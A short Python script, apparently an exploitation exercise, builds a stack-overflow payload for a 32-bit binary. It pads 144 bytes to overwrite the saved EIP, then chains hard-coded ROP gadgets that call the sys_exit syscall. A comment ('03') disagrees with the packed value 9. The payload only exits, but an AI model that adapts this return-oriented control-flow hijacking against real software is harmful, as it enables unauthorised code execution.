"""
This code will execute sys_exit 

sys_exit syscall : eax -> 1, ebx -> <RETURN VALUE>

"""

import struct

p = 'A'*144 #144 because between 144 and 144+4 (148) we control EIP backup 



p += struct.pack('<I', 0x0804fd80) # xor eax, eax ; eax = 0 # -> EIP BACKUP (start of our instruction chain)
p += struct.pack('<I', 0x0808003e) # inc eax # ; eax = 1    # -> EIP BACKUP + 4
p += struct.pack('<I', 0x08049022) # pop ebx                # -> EIP BACKUP + 8
p += struct.pack('<I', 0x00000009) # 03                     # -> EIP BACKUP + 12
p += struct.pack('<I', 0x0804a3e2) # int 0x80 ; syscall     # -> EIP BACKUP + 16

file = open("payload", "w")
file.write(p)